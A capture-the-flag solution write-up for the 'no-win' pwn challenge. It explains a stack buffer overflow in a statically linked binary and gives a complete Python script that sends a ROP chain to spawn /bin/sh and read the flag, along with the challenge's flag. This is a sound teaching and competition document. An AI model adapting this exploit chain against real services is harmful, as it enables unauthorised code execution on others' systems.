# no-win - Solution Writeup

## The Challenge
**Description:**
> no win(), so good luck

**Flag:** `NNS{no_W1n_FUNC71oN_so_You_bui17_YoUR_0Wn_5YsCal1}`

## Analysis

This challenge is a classic **Return-Oriented Programming (ROP)** challenge. We are provided with a statically linked 64-bit ELF binary without a `win` function. 

Looking at the source code (`chall.c`), the vulnerability is a massive buffer overflow:
```c
int main(void) {
    char buf[64];
...
    read(STDIN_FILENO, buf, 512);
    return 0;
}
```
The program reads up to 512 bytes into a 64-byte buffer on the stack. The `read` function blocks until it either receives 512 bytes or the connection is closed.

Because the binary is statically linked and not stripped, we can extract gadgets directly from the executable to build a ROP chain that executes the `execve` syscall to spawn `/bin/sh`.

## Exploitation Strategy

We need to make the `execve("/bin/sh", NULL, NULL)` system call. This requires:
1. `rax = 59` (syscall number for `execve`)
2. `rdi = pointer to "/bin/sh\x00"`
3. `rsi = pointer to NULL`
4. `rdx = pointer to NULL`

Since the string `"/bin/sh"` is not present in the binary, we must write it to a known writable memory location. We'll use the `.data` section at `0x4aa0c0 + 0x80`. 

To do this, we can use the `mov [rdx], rax` gadget found at `0x40ff98`. We'll write the string `/bin/sh\x00` and also write null terminators for the `rsi` and `rdx` pointers.

The ROP Gadgets used:
- `pop rdi ; pop rbp ; ret` (`0x402128`)
- `pop rsi ; pop rbp ; ret` (`0x40a3c2`)
- `pop rdx ; ret` (`0x413210`)
- `pop rax ; ret` (`0x427eeb`)
- `mov [rdx], rax ; ret` (`0x40ff98`)
- `syscall` (`0x401324`)

Finally, to trigger the vulnerability without closing the connection prematurely, we must pad our payload to exactly 512 bytes. This forces the `read()` syscall to return immediately and triggers our ROP chain, giving us a shell.

## The Solve Script

Here is a Python script that connects to the instance over SSL, sends the padded ROP chain, and executes `cat /flag.txt` through the newly spawned shell.

```python
import socket
import ssl
import struct
import time

def p64(addr):
    return struct.pack('<Q', addr)

def solve():
    host = 'no-win-scenario-23157edb6c2a.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    pop_rdi_rbp = 0x402128
    pop_rsi_rbp = 0x40a3c2
    pop_rdx = 0x413210
    pop_rax = 0x427eeb
    mov_rdx_rax = 0x40ff98
    syscall = 0x401324
    
    data_sec = 0x4aa0c0 + 0x80
    binsh = b"/bin/sh\x00"

    # 64 bytes buffer + 8 bytes saved rbp
    payload = b"A" * 72
    
    # 1. Write "/bin/sh\x00" to .data
    payload += p64(pop_rdx) + p64(data_sec)
    payload += p64(pop_rax) + binsh
    payload += p64(mov_rdx_rax)
    
    # 2. Write NULL to .data + 8
    payload += p64(pop_rdx) + p64(data_sec + 8)
    payload += p64(pop_rax) + p64(0)
    payload += p64(mov_rdx_rax)
    
    # 3. Write NULL to .data + 16
    payload += p64(pop_rdx) + p64(data_sec + 16)
    payload += p64(pop_rax) + p64(0)
    payload += p64(mov_rdx_rax)

    # 4. Set up registers for execve
    payload += p64(pop_rdi_rbp) + p64(data_sec) + p64(0x0)
    payload += p64(pop_rsi_rbp) + p64(data_sec + 8) + p64(0x0)
    payload += p64(pop_rdx) + p64(data_sec + 16)
    payload += p64(pop_rax) + p64(59)
    
    # 5. Execute syscall
    payload += p64(syscall)
    
    # Pad payload to exactly 512 bytes to force read() to return
    payload = payload.ljust(512, b"B")

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected!")
            ssock.recv(1024)
            
            print("Sending ROP chain...")
            ssock.sendall(payload)
            time.sleep(1)
            
            print("Trying to read flag...")
            ssock.sendall(b"cat /flag.txt\n")
            time.sleep(1)
            
            print(ssock.recv(4096).decode(errors='ignore'))

if __name__ == "__main__":
    solve()
```
